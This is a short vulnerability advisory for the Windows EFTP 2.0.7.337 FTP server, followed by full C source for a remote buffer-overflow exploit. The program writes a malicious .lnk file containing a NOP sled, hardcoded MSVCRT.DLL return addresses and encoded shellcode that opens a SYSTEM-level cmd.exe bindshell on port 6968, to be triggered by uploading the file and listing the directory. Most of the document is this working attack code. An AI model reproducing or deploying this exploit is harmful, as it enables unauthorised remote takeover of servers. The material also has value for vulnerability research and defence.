source: http://www.securityfocus.com/bid/3330/info

Encrypted FTP (EFTP) is both an FTP client and server application for Windows platforms.

A malicious user with upload permissions to the target host can cause a buffer overflow in EFTP to execute code of the attacker's choosing. The attacker can potentially use this exploit to open a bindshell on the target host. Another possible result of this exploit is a denial of service. 

/***************************************************************
 * EFTP Version 2.0.7.337 remote exploit                       *
 *                                                             *
 * create spl0it.lnk                                           *
 * upload the file using the EFTP client                       *
 * (since I'm not planning to rewrite that blowfish crypto)    *
 * then issue an LS command on the server                      *
 *                                                             *
 * impact: SYSTEM level access CMD.EXE shell on port 6968      *
 *                                                             *
 * [ByteRage] <byterage@yahoo.com> http://www.byterage.cjb.net *
 ***************************************************************/

#include <stdio.h>

#define FileName "spl0it.lnk"

/* You should set the following three consts according
 * to the DLL you are basing the exploit upon, examples :
 *********************************************
 * DLL Name    : MSVCRT.DLL
 * Version     : v6.00.8797.0000
 * File Length : 278581 bytes
 * newEIP =             "\x1C\xDF\x01\x78" (*)
 * LoadLibraryRef       "\xD4\x10\x03\x78"
 * GetProcAddressRefADD "\xFC"
 *********************************************
 * DLL Name    : MSVCRT.DLL
 * Version     : v6.00.8397.0000
 * File Length : 266293 bytes
 * newEIP =             "\x55\xE4\x01\x78" (*)
 * LoadLibraryRef       "\xD4\xE0\x02\x78"
 * GetProcAddressRefADD "\xFC"
 *********************************************
 * (*) the new EIP must CALL/JMP/... either
 *     EAX or EBX
 */
const char * newEIP =        "\x55\xE4\x01\x78";
#define LoadLibraryRef       "\xD4\xE0\x02\x78"
#define GetProcAddressRefADD "\xFC"

/* The following 452b shellcode
 * spawns a cmd.exe shell on port 6968
 * and is a personal rewrite of
 * dark spyrit's original code
 */

/* ==== SHELLC0DE START ==== */

const char shellc0de[] =  

/* CODE: */
"\x8b\xf0\xac\x84\xc0\x75\xfb\x8b\xfe\x33\xc9\xb1\xc1\x4e\x80\x36"
"\x99\xe2\xfa\xbb"LoadLibraryRef"\x56\xff\x13\x95\xac\x84\xc0\x75"
"\xfb\x56\x55\xff\x53"GetProcAddressRefADD"\xab\xac\x84\xc0\x75\xfb\xac\x3c\x21\x74"
"\xe7\x72\x03\x4e\xeb\xeb\x33\xed\x55\x6a\x01\x6a\x02\xff\x57\xe8"
"\x93\x6a\x10\x56\x53\xff\x57\xec\x6a\x02\x53\xff\x57\xf0\x33\xc0"
"\x57\x50\xb0\x0c\xab\x58\xab\x40\xab\x5f\x55\x57\x56\xad\x56\xff"
"\x57\xc0\x55\x57\xad\x56\xad\x56\xff\x57\xc0\xb0\x44\x89\x07\x57"
"\xff\x57\xc4\x8b\x46\xf4\x89\x47\x3c\x89\x47\x40\xad\x89\x47\x38"
"\x33\xC0\x89\x47\x30\x66\xb8\x01\x01\x89\x47\x2c\x57\x57\x55\x55"
"\x55\x6a\x01\x55\x55\x56\x55\xff\x57\xc8\xff\x76\xf0\xff\x57\xcc"
"\xff\x76\xfc\xff\x57\xcc\x55\x55\x53\xff\x57\xf4\x93\x33\xc0\xb4"
"\x04\x50\x6a\x40\xff\x57\xd4\x96\x6a\x50\xff\x57\xe0\x8b\xcd\xb5"
"\x04\x55\x55\x57\x51\x56\xff\x77\xaf\xff\x57\xd0\x8b\x0f\xe3\x18"
"\x55\x57\x51\x56\xff\x77\xaf\xff\x57\xdc\x0b\xc0\x74\x21\x55\xff"
"\x37\x56\x53\xff\x57\xf8\xeb\xd0\x33\xc0\x50\xb4\x04\x50\x56\x53"
"\xff\x57\xfc\x55\x57\x50\x56\xff\x77\xb3\xff\x57\xd8\xeb\xb9\xff"
"\x57\xe4"

/* DATA: (XORed with 099) */
"\xd2\xdc\xcb\xd7\xdc\xd5\xaa\xab\x99\xda\xeb\xfc\xf8\xed\xfc\xc9"
"\xf0\xe9\xfc\x99\xde\xfc\xed\xca\xed\xf8\xeb\xed\xec\xe9\xd0\xf7"
"\xff\xf6\xd8\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc\xea"
"\xea\xd8\x99\xda\xf5\xf6\xea\xfc\xd1\xf8\xf7\xfd\xf5\xfc\x99\xc9"
"\xfc\xfc\xf2\xd7\xf8\xf4\xfc\xfd\xc9\xf0\xe9\xfc\x99\xde\xf5\xf6"
"\xfb\xf8\xf5\xd8\xf5\xf5\xf6\xfa\x99\xce\xeb\xf0\xed\xfc\xdf\xf0"
"\xf5\xfc\x99\xcb\xfc\xf8\xfd\xdf\xf0\xf5\xfc\x99\xca\xf5\xfc\xfc"
"\xe9\x99\xdc\xe1\xf0\xed\xc9\xeb\xf6\xfa\xfc\xea\xea\x99\xb8\xce"
"\xca\xd6\xda\xd2\xaa\xab\x99\xea\xf6\xfa\xf2\xfc\xed\x99\xfb\xf0"
"\xf7\xfd\x99\xf5\xf0\xea\xed\xfc\xf7\x99\xf8\xfa\xfa\xfc\xe9\xed"
"\x99\xea\xfc\xf7\xfd\x99\xeb\xfc\xfa\xef\x99\x99\x9b\x99\x82\xa1"
"\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\xfa\xf4\xfd\x99"

"\x00";

/* ==== SHELLC0DE ENDS ==== */

;

int i;

FILE *file;

int main ()
{
  
  printf("EFTP Version 2.0.7.337 remote exploit by [ByteRage]\n");

  file = fopen(FileName, "w+b");
  if (!file) {
    printf("ERROR! Couldn't open "FileName" for output !\n");
    return 1;
  }
  
  for (i=0; i<1740; i++) { fwrite("\x90", 1, 1, file); }
  fwrite("\xEB\x06\x90\x90", 1, 4, file);  
  fwrite(newEIP, 1, 4, file); 
  fwrite(shellc0de, 1, sizeof(shellc0de)-1, file);

  fclose(file);

  printf(FileName" created! (Shellcode length: %i bytes)\n", sizeof(shellc0de));
  return 0;

}